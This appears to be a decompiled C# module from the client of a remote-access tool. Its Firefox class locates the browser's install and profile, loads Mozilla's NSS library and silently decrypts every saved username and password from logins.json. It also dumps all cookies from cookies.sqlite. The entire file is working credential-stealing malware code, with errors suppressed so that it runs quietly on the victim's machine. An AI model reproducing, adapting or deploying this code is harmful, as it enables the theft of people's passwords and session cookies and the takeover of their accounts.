using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using xClient.Core.Data;
using xClient.Core.Extensions;
using xClient.Core.Helper;
using xClient.Core.Recovery.Utilities;
using xClient.Core.Utilities;

namespace xClient.Core.Recovery.Browsers;

public static class Firefox
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long NSS_InitPtr(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long PK11_GetInternalKeySlotPtr();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	private struct TSECItem
	{
		public int SECItemType;

		public int SECItemData;

		public int SECItemLen;
	}

	public class Login
	{
		public int id { get; set; }

		public string hostname { get; set; }

		public object httpRealm { get; set; }

		public string formSubmitURL { get; set; }

		public string usernameField { get; set; }

		public string passwordField { get; set; }

		public string encryptedUsername { get; set; }

		public string encryptedPassword { get; set; }

		public string guid { get; set; }

		public int encType { get; set; }

		public long timeCreated { get; set; }

		public long timeLastUsed { get; set; }

		public long timePasswordChanged { get; set; }

		public int timesUsed { get; set; }
	}

	public class JsonFFData
	{
		public int nextId { get; set; }

		public List<Login> logins { get; set; }

		public List<object> disabledHosts { get; set; }

		public int version { get; set; }
	}

	private static IntPtr nssModule;

	private static DirectoryInfo firefoxPath;

	private static DirectoryInfo firefoxProfilePath;

	private static FileInfo firefoxLoginFile;

	private static FileInfo firefoxCookieFile;

	static Firefox()
	{
		try
		{
			firefoxPath = GetFirefoxInstallPath();
			if (firefoxPath == null)
			{
				throw new NullReferenceException("Firefox is not installed, or the install path could not be located");
			}
			firefoxProfilePath = GetProfilePath();
			if (firefoxProfilePath == null)
			{
				throw new NullReferenceException("Firefox does not have any profiles, has it ever been launched?");
			}
			firefoxLoginFile = GetFile(firefoxProfilePath, "logins.json");
			if (firefoxLoginFile == null)
			{
				throw new NullReferenceException("Firefox does not have any logins.json file");
			}
			firefoxCookieFile = GetFile(firefoxProfilePath, "cookies.sqlite");
			if (firefoxCookieFile == null)
			{
				throw new NullReferenceException("Firefox does not have any cookie file");
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<RecoveredAccount> GetSavedPasswords()
	{
		List<RecoveredAccount> list = new List<RecoveredAccount>();
		try
		{
			InitializeDelegates(firefoxProfilePath, firefoxPath);
			JsonFFData jsonFFData = new JsonFFData();
			using (StreamReader streamReader = new StreamReader(firefoxLoginFile.FullName))
			{
				jsonFFData = JsonUtil.Deserialize<JsonFFData>(streamReader.ReadToEnd());
			}
			foreach (Login login in jsonFFData.logins)
			{
				string username = Decrypt(login.encryptedUsername);
				string password = Decrypt(login.encryptedPassword);
				Uri uri = new Uri(login.formSubmitURL);
				list.Add(new RecoveredAccount
				{
					URL = uri.AbsoluteUri,
					Username = username,
					Password = password,
					Application = "Firefox"
				});
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static List<FirefoxCookie> GetSavedCookies()
	{
		List<FirefoxCookie> list = new List<FirefoxCookie>();
		SQLiteHandler sQLiteHandler = new SQLiteHandler(firefoxCookieFile.FullName);
		if (!sQLiteHandler.ReadTable("moz_cookies"))
		{
			throw new Exception("Could not read cookie table");
		}
		int rowCount = sQLiteHandler.GetRowCount();
		for (int i = 0; i < rowCount; i++)
		{
			try
			{
				string value = sQLiteHandler.GetValue(i, "host");
				string value2 = sQLiteHandler.GetValue(i, "name");
				string value3 = sQLiteHandler.GetValue(i, "value");
				string value4 = sQLiteHandler.GetValue(i, "path");
				bool secure = ((!(sQLiteHandler.GetValue(i, "isSecure") == "0")) ? true : false);
				bool httpOnly = ((!(sQLiteHandler.GetValue(i, "isSecure") == "0")) ? true : false);
				long num = long.Parse(sQLiteHandler.GetValue(i, "expiry"));
				long num2 = ToUnixTime(DateTime.Now);
				DateTime expiresUTC = FromUnixTime(num);
				bool expired = num2 > num;
				list.Add(new FirefoxCookie
				{
					Host = value,
					ExpiresUTC = expiresUTC,
					Expired = expired,
					Name = value2,
					Value = value3,
					Path = value4,
					Secure = secure,
					HttpOnly = httpOnly
				});
			}
			catch (Exception)
			{
				return list;
			}
		}
		return list;
	}

	private static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
	{
		if (new Version(FileVersionInfo.GetVersionInfo(firefoxPath.FullName + "\\firefox.exe").FileVersion).Major >= new Version("35.0.0").Major)
		{
			NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr100.dll");
			NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp100.dll");
			NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
			NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
			NativeMethods.LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
			nssModule = NativeMethods.LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
			((NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(nssModule, "NSS_Init"), typeof(NSS_InitPtr)))(firefoxProfilePath.FullName);
			PK11_Authenticate(PK11_GetInternalKeySlot(), loadCerts: true, 0L);
		}
	}

	private static DateTime FromUnixTime(long unixTime)
	{
		return new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(unixTime);
	}

	private static long ToUnixTime(DateTime value)
	{
		return (long)(value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime()).TotalSeconds;
	}

	private static DirectoryInfo GetProfilePath()
	{
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(path))
		{
			throw new Exception("Firefox Application Data folder does not exist!");
		}
		DirectoryInfo[] directories = new DirectoryInfo(path).GetDirectories();
		if (directories.Length == 0)
		{
			throw new IndexOutOfRangeException("No Firefox profiles could be found");
		}
		return directories[0];
	}

	private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
	{
		FileInfo[] files = profilePath.GetFiles(searchTerm);
		int num = 0;
		if (0 >= files.Length)
		{
			throw new Exception("No Firefox logins.json was found");
		}
		return files[num];
	}

	private static DirectoryInfo GetFirefoxInstallPath()
	{
		using (RegistryKey registryKey = (PlatformHelper.Is64Bit ? RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Mozilla\\Mozilla Firefox") : RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Mozilla\\Mozilla Firefox")))
		{
			if (registryKey == null)
			{
				return null;
			}
			string[] subKeyNames = registryKey.GetSubKeyNames();
			if (subKeyNames.Length == 0)
			{
				throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
			}
			using RegistryKey key = registryKey.OpenSubKey(subKeyNames[0]);
			string valueSafe = key.OpenReadonlySubKeySafe("Main").GetValueSafe("Install Directory");
			if (string.IsNullOrEmpty(valueSafe))
			{
				throw new NullReferenceException("Install string was null or empty");
			}
			firefoxPath = new DirectoryInfo(valueSafe);
		}
		return firefoxPath;
	}

	private static IntPtr LoadWin32Library(string libPath)
	{
		if (string.IsNullOrEmpty(libPath))
		{
			throw new ArgumentNullException("libPath");
		}
		IntPtr intPtr = NativeMethods.LoadLibrary(libPath);
		if (intPtr == IntPtr.Zero)
		{
			int lastWin32Error = Marshal.GetLastWin32Error();
			throw new Exception(innerException: new Win32Exception(lastWin32Error)
			{
				Data = { 
				{
					(object)"LastWin32Error",
					(object?)lastWin32Error
				} }
			}, message: "can't load DLL " + libPath);
		}
		return intPtr;
	}

	private static long PK11_GetInternalKeySlot()
	{
		return ((PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(nssModule, "PK11_GetInternalKeySlot"), typeof(PK11_GetInternalKeySlotPtr)))();
	}

	private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
	{
		return ((PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(nssModule, "PK11_Authenticate"), typeof(PK11_AuthenticatePtr)))(slot, loadCerts, wincx);
	}

	private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
	{
		return ((NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(nssModule, "NSSBase64_DecodeBuffer"), typeof(NSSBase64_DecodeBufferPtr)))(arenaOpt, outItemOpt, inStr, inLen);
	}

	private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
	{
		return ((PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(nssModule, "PK11SDR_Decrypt"), typeof(PK11SDR_DecryptPtr)))(ref data, ref result, cx);
	}

	private static string Decrypt(string cypherText)
	{
		StringBuilder stringBuilder = new StringBuilder(cypherText);
		int value = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
		TSECItem result = default(TSECItem);
		TSECItem data = (TSECItem)Marshal.PtrToStructure(new IntPtr(value), typeof(TSECItem));
		if (PK11SDR_Decrypt(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
		{
			byte[] array = new byte[result.SECItemLen];
			Marshal.Copy(new IntPtr(result.SECItemData), array, 0, result.SECItemLen);
			return Encoding.UTF8.GetString(array);
		}
		return null;
	}
}
